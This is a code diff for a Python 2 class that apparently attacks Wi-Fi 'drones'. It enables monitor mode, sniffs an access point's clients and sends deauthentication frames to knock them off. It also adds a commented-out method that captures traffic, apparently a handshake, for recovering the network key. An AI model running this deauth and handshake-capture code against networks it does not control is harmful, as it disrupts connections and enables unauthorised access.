@@ -39,7 +39,8 @@ class Environment:
             self.__startmonitormode(index)
             self.__gettargets(index)
             self.__deauthtargets()
-            self.__stopmonitormode()
+            #self.__capturepsk(index)
+            #self.__stopmonitormode()
         else:
             print 'Out of bounds! Only ' + len(self.accesspoints) + ' drones found.'
             
@@ -68,13 +69,22 @@ class Environment:
             commands.deauth(self.mondevice, target.accesspoint.mac, target.mac)
     
     
+    def __capturepsk(self, index):
+        
+        accesspoint = self.accesspoints[index]
+        #commands.cleanfiles(accesspoint.dumpfilename, wildcard=True)
+        commands.sniffssid(self.mondevice, accesspoint.ssid, accesspoint.channel, accesspoint.dumpfilename + '-01')
+        
+        time.sleep(10)
+    
+    
     def __gettargets(self, index):
         
         accesspoint = self.accesspoints[index]
         commands.cleanfiles(accesspoint.dumpfilename, wildcard=True)
         commands.sniffssid(self.mondevice, accesspoint.ssid, accesspoint.channel, accesspoint.dumpfilename)
         
-        time.sleep(15)
+        time.sleep(20)
         
         try:
             with open(accesspoint.dumpfilename + '-01.csv', 'r') as f:
@@ -112,4 +122,5 @@ class Environment:
         self.monitormode = False
         
         print 'Monitor mode stopped on ' + self.mondevice + '...'
+    
     
